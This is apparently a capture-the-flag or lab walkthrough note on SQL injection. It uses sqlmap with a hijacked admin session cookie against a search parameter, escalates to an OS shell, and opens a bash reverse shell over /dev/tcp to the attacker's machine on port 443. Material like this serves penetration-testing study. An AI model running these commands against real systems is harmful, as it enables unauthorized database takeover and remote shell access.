# SQL Injection
```ad-info
SQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws. SQLmap automates the process of detecting and exploiting SQL injection. SQL Injection attacks can take control of databases that utilize SQL.
```

In the website there is a search bar that we can explote with SQL injection.
We can use sqlmap but before executing any command, we will need to grab the cookie to authenticat admin user. 
[//]: Install cooki-editor extension

```bash
$ sqlmap -u http://10.129.95.174/dashboard.php?search=hello --cookie="PHPSESSID=rp7ki2fucgrc0brl7f1l9j5p9e"
```

[//]: Press enter for the Default answer 

The tool confirmed that the target is vulnerable to SQL injection.
`GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)?  [y/N]`

```bash
$ sqlmap -u http://10.129.95.174/dashboard.php?search=hello --cookie="PHPSESSID=rp7ki2fucgrc0brl7f1l9j5p9e" --os-shell
```

To make the shell more stable and interactive, we will setup a netcat listener on port 443 and use the following command:

```SQL
os-shell> bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```

